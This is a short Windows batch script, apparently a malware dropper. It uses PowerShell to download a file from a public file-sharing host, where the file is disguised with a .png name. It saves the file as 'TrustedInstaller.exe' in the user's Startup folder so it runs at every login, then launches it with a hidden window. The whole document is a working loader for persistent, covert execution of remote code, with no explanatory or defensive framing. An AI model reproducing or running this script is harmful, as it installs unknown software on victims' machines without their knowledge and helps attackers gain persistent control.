@echo off

set powershell=%SYSTEMROOT%\System32\WindowsPowerShell\v1.0\powershell.exe
set "DownloadURL=https://files.catbox.moe/bzieec.png"
set "DestinationPath=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\TrustedInstaller.exe"
powershell -Command "Invoke-WebRequest -useb '%DownloadURL%' -o '%DestinationPath%'"
powershell -Command "Start-Process '%DestinationPath%' -WindowStyle Hidden"
